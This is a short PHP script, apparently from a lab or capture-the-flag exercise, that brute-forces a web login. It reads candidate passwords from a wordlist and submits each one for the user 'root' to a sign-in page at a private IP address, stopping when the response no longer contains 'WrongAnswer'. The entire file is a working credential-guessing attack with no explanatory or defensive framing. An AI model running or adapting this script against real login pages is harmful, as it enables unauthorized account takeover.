<?php

include "simple_html_dom.php";

function loop($url) {
	$html = file_get_html($url);
	if (strpos($html, "WrongAnswer") != False)
		return false;
	return true;
}

$handle = fopen("./dict", "r");
    while (($line = fgets($handle)) !== false) {
		$line = str_replace("\n", '', $line);
		if (loop("http://192.168.101.129/index.php?page=signin&username=root&password=$line&Login=login#") == False)
			echo $line . " -> No :(" . "\n";
		else {
			echo "Password found !\n  -> " . $line . "\n";
			exit;
		}
    }
?>
